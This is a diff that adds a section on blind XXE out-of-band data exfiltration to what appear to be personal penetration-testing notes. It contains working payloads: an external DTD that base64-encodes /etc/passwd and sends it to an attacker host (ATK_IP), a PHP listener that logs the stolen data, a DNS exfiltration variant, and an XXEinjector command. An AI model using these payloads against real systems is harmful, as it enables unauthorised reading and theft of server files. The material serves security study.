@@ -139,5 +139,41 @@ We can then reference this in out payload:
 
 ### Out-of-band Data Exfiltration
 When dealing with blind injections (*which in this day is pretty common*), we can utilise *Out-of-band (OOB) data exfiltration*. This is a common technique for many injections (SQLi, XXE, Command injection etc). The idea is that we encode the data, then attempt to make a request to our attack web server containing the encoded data:
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATK_IP:8000/?content=%file;'>">
+```
 
-We can setup a quick 
+We can setup a quick http server to send out encoded content too eg.
+```php
+# index.php
+<?php
+if(isset($_GET['content'])){
+	error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+```bash
+php -S 0.0.0.0:8000
+```
+
+We can then submit our payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+	<!ENTITY % remote SYSTEM "http://ATK_IP:8000/xxe.dtd">
+	%remote;
+	%oob;
+]>
+<root>&content;</root>
+```
+> We could also use DNS OOB if needed, where we have a domain and we send the data as a subdomain (eg. `CONTENT.attacker.com`) then we can use a tool like `Wireshark` or `tcpdump` to view the requests.
+
+#### Automated OOB Exfiltration
+[XXEinjector](https://github.com/enjoiz/XXEinjector) is a tool for automating XXE injection and supports a variety of methods including blind OOB. We can clone the tool and the copy the HTTP request from [[Burp Suite]] for the XXE location. We can then run the tool, referencing the HTTP request as a file for it.
+> We don't need to include the XML payload ourselves in the request, just the first line `<?xml version="1.0" encoding="UTF-8">` and write `XXEINJECT` on the next line to help the tool locate it.
+
+```bash
+ruby XXEinjector.rb --host=[ATK_HOST] --httpport=8000 --file=/tmp/xxe.req --path=[file_to_read] --oob=http
+```
+> We can run other types of exploits too with this tool and we can extend it with other flags eg. `--phpfilter` which will use the PHP base64 filter.
